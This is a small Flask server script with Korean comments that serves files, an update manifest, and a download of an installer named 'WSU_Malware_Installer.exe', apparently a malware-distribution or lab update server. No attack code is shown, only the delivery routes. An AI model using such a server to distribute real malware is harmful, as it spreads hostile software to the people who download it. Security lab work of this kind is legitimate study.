import os
from flask import Flask, send_from_directory, render_template

app = Flask(__name__, static_url_path='/static')

# 파일 요청용 API
@app.route('/file/<path:filename>', methods=['GET'])
def get_file(filename):
    return send_from_directory('static/files', filename, as_attachment=True)

# 기존 manifest 제공 라우트
@app.route('/manifest', methods=['GET'])
def get_manifest():
    return send_from_directory('static', 'update_manifest.json')

@app.route('/download')
def download():
    return send_from_directory("static/installers", "WSU_Malware_Installer.exe", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7070)
